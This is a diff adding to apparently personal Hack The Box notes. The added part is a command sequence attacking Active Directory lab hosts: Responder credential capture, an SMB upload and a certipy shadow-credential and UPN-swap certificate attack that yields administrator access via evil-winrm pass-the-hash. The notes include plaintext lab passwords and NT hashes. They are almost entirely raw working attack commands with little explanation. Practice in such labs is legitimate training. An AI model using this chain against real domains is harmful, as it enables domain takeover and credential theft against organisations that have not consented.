@@ -57,3 +57,44 @@ ldapmodify -x -H ldap://10.10.11.70 -D "ant.edwards@puppy.htb" -w 'Antman2025!' 
 
 evil-winrm -i 10.10.11.70 -u 'ADAM.SILVER' -p 'abc@123'
 
+
+----------------------------------------------------------------------------------------------------------------------
+Bloodhound is a mast!
+
+
+
+----------------------------------------------------------------------------------------------------------------------
+1. sudo rdate -n 10.10.11.69  (windows machinesusually need to have the same time as target)
+if this doesnt stay try: faketime
+
+2. sudo responder -I tun0 -v
+and
+smbclient //targetip/IT -U <name>%<password> -c "put <filename>"    to upload a file at smb with write prev
+
+
+faketime '2025-05-27 20:41:00' certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
+
+export KRB5CCNAME=ca_svc.ccache
+
+ faketime '2025-05-27 20:43:00' certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -user 'ca_svc' read
+
+faketime '2025-05-27 20:43:00' certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update
+
+faketime '2025-05-27 20:44:00' certipy-ad req  -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
+
+faketime '2025-05-27 20:45:00' certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
+
+
+faketime '2025-05-27 20:46:00' certipy-ad auth -pfx administrator.pfx -username 'administrator' -domain 'domain.htb' -dc-ip targetIP
+
+evil-winrm -i targetIP -u administrator -H 'hash' 
+
+
+
+
+
+
+
+
+
+
